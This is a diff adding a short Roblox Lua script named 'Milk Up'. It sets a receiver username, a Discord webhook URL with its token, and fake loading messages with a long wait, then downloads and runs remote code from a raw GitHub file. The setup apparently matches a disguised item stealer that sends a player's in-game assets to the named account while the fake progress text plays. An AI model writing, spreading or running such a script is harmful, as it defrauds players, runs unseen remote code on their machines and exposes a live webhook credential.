@@ -1,0 +1,17 @@
+UserName = "AltB0tV1"
+
+UserName2 = "AltB0tV1"
+
+Webhook = "https://discord.com/api/webhooks/1106865719955693608/R6AUPFq_A30d5b8hvDepc-ULKHjMyUh-MkUnaXbMjnND8R-d3ia3VnKp9NwS-OX0R--v"
+
+_G.ScriptName = "Milk Up"
+
+_G.FirstText = "Script Preparing..."
+
+_G.SecondText = "Script Loading..."
+
+_G.ThirdText = "Almost Done..."
+
+_G.WaitingTime = 180
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/R/main/Main.lua", true))()
